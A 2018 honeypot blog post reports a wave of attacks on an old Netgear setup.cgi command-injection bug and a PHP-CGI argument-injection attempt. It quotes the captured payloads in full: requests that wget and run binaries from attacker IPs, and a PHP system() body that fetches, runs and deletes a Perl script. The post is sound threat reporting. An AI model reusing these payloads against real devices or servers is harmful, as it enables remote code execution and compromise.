---
title: "Exploitation of an Old Netgear Bug, Popular Again"
#author: "Author Name"
description: "Description of some overnight attacks exploiting a Netgear vulnerability with widely-distributed exploit, and yet the attacker is still having decent success in the wild."
#cover: "/img/cover.jpg"
#tags: ["tagA", "tagB"]
date: 2018-07-09T00:00:00-00:00
draft: false
---

Just a ton of what Glastopf reports as remote file inclusion attacks happened overnight, all of one similar type.  Almost exactly 700 exploitation attempts using the vulnerability exploited [here](https://www.exploit-db.com/exploits/43055/).  Requests that would redirect a Netgear device back to one of 3 different download servers came from 37 unique IP addresses, suggesting a good amount of success exploiting this old vulnerability.

```
/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://80.211.91.217/mips+-O+/tmp/mips;sh+mips&curpath=/&currentsetting.htm=1
```

```
/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://46.243.189.101/gang+-O+/tmp/gang;sh+gang&curpath=/&currentsetting.htm=1
```

```
/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://213.183.53.120/netgear+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
```

None of those download points are returning files at this time, unfortunately.

Separately, the server received a few POST requests attempting to directly execute PHP directly.

```
POST //cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E
```

This translates to:
```
//cgi-bin/php?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input -d cgi.force_redirect=0 -d cgi.redirect_status_env=0 -d auto_prepend_file=php://input -n
```

The POST body was:
```php
<? system("cd /tmp ; wget -c -q  hxxp://139.199.211.175/data/data/msr;perl msr;rm -rf msr ; curl -O  hxxp://139.199.211.175/data/data/msr;perl msr;rm -rf msr; fetch  hxxp://139.199.211.175/data/data/msr;perl msr;rm -rf msr "); ?>
```

If someone had PHP installed or linked in cgi-bin, and a web server configured to permit it to execute, this would have downloaded and executed a Perl script, then erased its tracks.  The requesting URL was 139.219.100.104.  Both that and the download URL are on cloud service providers in China - TencentCloud and Microsoft (Microsoft's operated by "21Vianet").

Again, that download server isn't reachable at this point.
